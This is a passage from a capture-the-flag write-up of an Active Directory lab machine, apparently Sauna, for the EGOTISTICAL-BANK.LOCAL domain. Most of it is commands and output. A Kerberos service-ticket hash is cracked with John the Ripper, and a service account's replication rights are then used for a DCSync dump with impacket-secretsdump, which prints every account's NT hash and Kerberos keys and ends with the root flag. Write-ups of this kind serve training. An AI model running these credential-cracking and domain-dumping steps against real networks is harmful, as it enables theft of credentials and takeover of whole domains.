$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL/HSmith*$403c5a85898ca19111074cadc05521d8$e98c7f54d279afc07d8e3356a6d175ce967e514d3d5d2a332f6e70a668cb9a5dfd404c2b2dbea650e574dacd1840a2ef5bc9ccb7b70d892889526067935e4b0cc1ff6cae3f2e38fe832ce3fb8414e0dfebffed137a22984e510768eac598df194671115147cc602638f489da9e5684df630fb01bd790a03ac09e7026159e5eb0e2b3d0d2beda9d5bda24aa0dfaf87186833ba831ce3d9bd9b1187dea55272715157d6c640e271aff6897cb335fe8cd93afe1f2e5488d4c12ed53c2b4ca3a935cd15e2e8bfb02e8cbf65501ed9dba65d821e27b6cc225b1578fc696b250d4e1ee75ccd847c6eea5fc94c9f981724c250736f418300d06269a98666c867e7c61badbfed9a005a143ca4f1952415cf37669e00f5ff0ec4454a67002e48ccebdaa4201f802902d8437d07b95d581c6e8aa025d8f2a8f0c8ff3f798c97637382a25d9339ea9817f7d0033418324fa5e762027c72d9a604aaa17b96c61b9a0a509570cfc142e0417e93f028a46c48120313515a5457735145dfda407c0b93b59605c401d216b0429e84f9730098b1b15190121d41c611b19e4e64bef11ed81d6a99e4db215fec62439b540a70bba803203321f6a55247ef3942405feb2f643477256c17a7e149922886b4a85d79031ec35ad30112bbf77d431a073653a929f3e030c98caa9dab08a2a9cbf8722059f17a46bee6f9a591638f42e45aca59facb37d5fd9e41f77ccd56714fae2a3f8a1ae1490814962315e99972ea5a697e9bd04cfc9683849c8863b761420f862b363fd9972cd5c76f3529a78f0c5c5f8befac72fb8619b4fd4c37c7238a57ff638f880dafbb4ad53959c7bdcbd15069958c57d8db8eed6d41b619083e3f669d661e2d286609ca08ad2dc87203b7b00cd670b6bf86539209f00e707736ff84916a56c67d6a1f24af55cc391108f8c18548e52b40446273d3ebf481a66c8f3739858d954ea5ee95db33587d92b18eec02774d6f790ba680162f44917d1d9e6786de84fd836ed0b231b7efb421e93d0dcffbc39ee46bc8e59327d065a944d8f2c4f3007b9306e3adbfec2157623bade0133695581838d1604870adfdb62b458064427100f2ea143219ece2fb5afa6844dd0ca1522418b8bec24ceb6d9a4e03789fdcf4888bbf711781a4011d654fa25d84cd0ac4b16f164bf3a2844eba9bd597146aad5953ef4c9dfd9cfa438040b214302cdb9d84b684d1884a50163bae47934f07ed629431facf76705e8b4c25b4b05a2e4a536aa5f5db0927d8b290593f9dadea40b86b2352a6ec87049fe7e0d209fe8eceed0573e9c33d58c56c7a17b97658f79035e176f538298ef0020a3f2598e1ce325ce9e83b33678771f2c9f4226d707a4036d676454533200ed8954833e709abacdd6ef1a083950b183195a63940dabe49d5294d85a07407a76b04aee9dc28256839fa1cd95e27c
```

Saved the hash locally and bruteforced it utilizing john the ripper.

```
john hsmith.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     (?)     
1g 0:00:00:33 DONE (2026-01-28 18:55) 0.03008g/s 317058p/s 317058c/s 317058C/s Tiffani1432..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

It seems to be the same password as for user "Fsmith".

Let's check which windows permissions the user has on the system with bloodhound.

But this didn't provide us any value. Let's work on the svc_loanmgr account.

It seemed to be having OutboundObjectControl over the whole domain with "GetChanges" & "GetChangesAll" permissions, which is the same as an DSync Attack. 
We can dump the hashes of all the users on the domain with this user!

```
impacket-secretsdump EGOTISTICALBANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.59.252
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:4a1336b37969f73bf1d4d5e301de52fe:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:2809382f95b8dfd4aa8c24f878abefb5dbba095ca71890f4dc696ddc925d5047
SAUNA$:aes128-cts-hmac-sha1-96:fa33002f5f6d3ca786d02c0a25d8b4d1
SAUNA$:des-cbc-md5:104c515b86739e08
[*] Cleaning up..
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
e121c1b8054348572f4f782c500313ef
```